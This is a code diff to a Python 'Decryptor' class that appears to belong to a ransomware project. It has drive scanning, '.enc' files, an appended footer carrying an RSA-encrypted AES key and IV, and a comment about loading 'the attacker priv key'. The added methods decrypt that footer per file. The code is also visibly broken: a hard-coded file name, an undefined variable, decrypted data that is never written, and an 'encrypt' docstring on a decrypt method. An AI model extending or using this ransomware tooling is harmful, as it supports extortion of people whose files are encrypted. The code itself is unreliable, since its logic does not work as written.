@@ -1,10 +1,13 @@
 from symEncryption import *
 import ctypes
 import concurrent.futures # voor threading pools
+import subprocess
+import psutil
 import os
 import time
 from keygen import *
 from collections import deque # voor snellere list operaties
+import mmap
 
 class Decryptor:
 
@@ -83,35 +86,71 @@ class Decryptor:
         
         end_time = time.time()
         print(f"[LOG] Files found: {len(self.filepaths)}, time elapsed: {end_time - start_time:.2f}s")
-        print(self.filepaths)
+        
 
     
     def get_footer(self, file_contents):
         with open(file_path, "rb") as encrypted_file:
             encrypted_file.read()
 
-    def decrypt_footer(self, footer):
+    def decrypt_footer(self, encrypted_IV, encrypted_AES_key):
         """
         this function is called for everyfile and creates the footer
         """
         #load in the attacker priv key
         keygen = Encryption("id:1")
-        #print("[LOG] generating footer")
-        keygen.load_private_key(self.private_key)
-
-
-
-        #encrypt iv
-        encrypted_iv = keygen.encrypt(iv)
         
-        #encrypt AES key
-        encrypted_key = keygen.encrypt(AES_key)
-        #print(f"footer: {encrypted_iv} {encrypted_key}")
+        keygen.load_private_key(self.private_key)
+        print("[LOG] succesfully loaded key")
+
+        #decrypt iv
+        iv = keygen.decrypt(encrypted_IV)
+        
+        #decrypt AES key
+        key = keygen.decrypt(encrypted_AES_key)
+        print(f"[LOG] footer decrypted: {iv} {key}")
         #create footer
-        return f"{encrypted_iv} {encrypted_key}"
+        
+        return iv, key
+
+    def decrypt(self, files_list=["image.jpg.enc"]):
+        """
+        The encrypt function called by threading.
+        """
+        encrypted_count = 0
+        files_list = deque(files_list)  # O(1) verwijderingen met deque
+
+        previous_encrypted_AES_key = ""
+
+        while files_list:
+
+            filepath = files_list.popleft()  # Verwijder bestand uit deque (O(1))
+
+            try:
+                # open file 
+                with open("image.jpg.enc", 'rb') as file:
+                    data = file.read()
+
+                    parts = data.split(b"---")
+
+                    encrypted_content = parts[0].strip()
+                    encrypted_IV = parts[1].strip().decode()
+                    encrypted_AES_key = parts[2].strip().decode()
+                    print("sucess")
 
 
+                if previous_encrypted_AES_key == encrypted_AES_key:
+                    pass
+                
+                else:
+                    print("[LOG] New footer detected, decrypting AES key")
+                    iv, AES_key = self.decrypt_footer(encrypted_IV, encrypted_AES_key)
 
+                #this is to preform a check if the previous footer is the same as the current footer
+                previous_encrypted_AES_key = AES_key
+
+            except Exception as e:
+                print(f"[LOG] error: {e}")
 
 if __name__ == "__main__":
     
@@ -135,5 +174,6 @@ rIm8EArVVAlDeDOVgjgKxdnMbgB9wnvB+kjxhjJrcZBbZOtR
 
     decrypt.scan_drives()
     decrypt.get_files()
+    decrypt.decrypt()
 
 
